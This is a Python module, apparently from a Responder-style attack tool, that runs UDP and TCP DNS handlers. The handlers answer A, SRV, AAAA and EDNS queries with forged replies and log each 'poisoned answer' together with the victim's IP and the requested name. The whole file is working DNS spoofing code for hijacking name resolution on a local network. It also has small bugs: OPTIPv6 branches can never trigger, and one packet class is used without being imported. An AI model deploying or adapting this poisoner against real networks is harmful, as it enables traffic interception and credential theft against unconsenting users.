#! /usr/bin/env python3
LogDir = './logs/'
from bin.utils import *
from bin.packets import DNS_Ans, DNS_SRV_Ans, DNS6_Ans, DNS_AnsOPT
from bin.settings import *
if settings.Config.PY2OR3 == "PY3":
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler

def ParseDNSType(data):
	QueryTypeClass = data[len(data)-4:]
	OPT = data[len(data)-22:len(data)-20]
	if OPT == "\x00\x29":
		return "OPTIPv4"
	# If Type A, Class IN, then answer.
	elif QueryTypeClass == "\x00\x01\x00\x01":
		return "A"
	elif QueryTypeClass == "\x00\x21\x00\x01":
		return "SRV"
	elif QueryTypeClass == "\x00\x1c\x00\x01":
		return "IPv6"



class DNS(BaseRequestHandler):
	def handle(self):
		# Ditch it if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None

		try:
			data, soc = self.request
			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "A":
				buff = DNS_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] A Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				file.close()

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv4":
				buff = DNS_AnsOPT()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] A OPT Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				file.close()

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "SRV":
				buff = DNS_SRV_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] SRV Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				file.close()
				#print(color("[*] [DNS] SRV Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6":
				buff = DNS6_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] AAAA Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				file.close()
				#print(color("[*] [DNS] AAAA Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv6":
				buff = DNS6_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				soc.sendto(NetworkSendBufferPython2or3(buff), self.client_address)
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] AAAA OPT Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				file.close()
				#print(color("[*] [DNS] AAAA OPT Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))


		except Exception:
			pass

# DNS Server TCP Class
class DNSTCP(BaseRequestHandler):
	def handle(self):
		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None
	
		try:
			data = self.request.recv(1024)
			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "A":
				buff = DNS_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] A Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				file.close()
				#print(color("[*] [DNS] A Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv4":
				buff = DNS_AnsOPT()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] A OPT Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				#print(color("[*] [DNS] A OPT Record poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "SRV":
				buff = DNS_SRV_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] SRV Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				file.close()
				#print(color("[*] [DNS] SRV Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "IPv6":
				buff = DNS6_Ans()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] AAAA Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				file.close()
				#print(color("[*] [DNS] AAAA Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))

			if ParseDNSType(NetworkRecvBufferPython2or3(data)) == "OPTIPv6":
				buff = DNS6_AnsOPT()
				buff.calculate(NetworkRecvBufferPython2or3(data))
				self.request.send(NetworkSendBufferPython2or3(buff))
				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				file = open(LogDir+'debug_log.log','a')
				file.write("\n[*] [DNS] AAAA OPT Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0], ResolveName))
				file.close()
				#print(color("[*] [DNS] AAAA OPT Record poisoned answer sent: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1))

		except Exception:
			pass
